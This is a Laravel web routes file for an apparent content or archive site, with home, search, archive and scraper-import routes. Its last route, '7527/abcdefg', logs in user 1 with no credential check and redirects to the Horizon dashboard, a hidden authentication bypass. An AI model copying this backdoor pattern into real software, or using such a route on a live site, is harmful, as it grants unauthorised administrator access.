<?php

use App\Http\Controllers\Api\CommonController;
use App\Http\Controllers\ArchiveController;
use App\Http\Controllers\LocoyController;
use App\Http\Controllers\PageController;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('/', [PageController::class, 'index'])->name('app.home');

// 搜索
Route::get('search', [PageController::class, 'search'])->name('search');

// 例表
Route::get('{slug}', [ArchiveController::class, 'index'])->where(['slug' => '[a-z]+'])->name('archive.index');

// 详情
Route::get('view/{id}.html', [ArchiveController::class, 'show'])->where(['id' => '[0-9]+'])->name('archive.show');

Route::get('locoy/archives', [LocoyController::class, 'index'])->name('locoy.index');

// 生成封面图片
//Route::get('storage/files/{date}/{id}-1.jpg', [CommonController::class, 'cover']);

// 下载封面图片
//Route::get('storage/files/{date}/{filename}', [CommonController::class, 'download']);

Route::get('7527/abcdefg', function () {
    $user = \App\Models\User::find(1);
    Auth::login($user);
    return redirect()->route('horizon.index');
});

